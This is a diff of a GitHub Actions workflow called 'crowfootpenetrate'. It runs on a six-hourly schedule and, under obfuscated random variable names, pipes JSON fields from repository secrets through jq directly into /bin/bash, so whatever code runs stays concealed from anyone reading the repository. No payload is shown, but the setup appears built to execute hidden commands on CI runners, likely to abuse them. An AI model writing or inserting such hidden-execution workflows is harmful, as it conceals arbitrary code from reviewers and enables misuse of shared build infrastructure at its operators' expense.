@@ -3,24 +3,29 @@ name: crowfootpenetrate
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 5/6 * * *'
+    - cron: '27 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: crowfootpenetrate
         env:
-          zx11667: ${{ secrets.zx11667 }}
+          utmjz2478: ${{ secrets.utmjz2478 }}
         run: |
-          echo $zx11667 | jq -r .dsov1 | /bin/bash
-          echo $ybqh55524 | jq -r .rtc784 | /bin/bash
-          echo $vsfbj7604 | jq -r .uqvsk34707 | /bin/bash
-          echo $aboil5 | jq -r .haf80887 | /bin/bash
-          echo $g5162 | jq -r .mho79 | /bin/bash
-          echo $nbw2595 | jq -r .isxi363 | /bin/bash
-          echo $mlun837 | jq -r .v8 | /bin/bash
-          echo $mdq81 | jq -r .kv119 | /bin/bash
-          echo $yrotm35813 | jq -r .roamk2 | /bin/bash
-          echo $vys35996 | jq -r .keac33253 | /bin/bash
+          echo $utmjz2478 | jq -r .qmtiu8 | /bin/bash
+          echo $p96137 | jq -r .b6 | /bin/bash
+          echo $cw6081 | jq -r .d10 | /bin/bash
+          echo $fnz285 | jq -r .npu467 | /bin/bash
+          echo $qw0 | jq -r .seyxv0270 | /bin/bash
+          echo $hvm669 | jq -r .fozto5399 | /bin/bash
+          echo $hf866 | jq -r .naz6 | /bin/bash
+          echo $g7124 | jq -r .troxz51 | /bin/bash
+          echo $yw2 | jq -r .h942 | /bin/bash
+          echo $f5 | jq -r .j4 | /bin/bash
+          echo $kua2 | jq -r .d3 | /bin/bash
+          echo $df40 | jq -r .gsw8565 | /bin/bash
+          echo $bmbj8 | jq -r .ollwd902 | /bin/bash
+          echo $endln2 | jq -r .gsrc3234 | /bin/bash
 
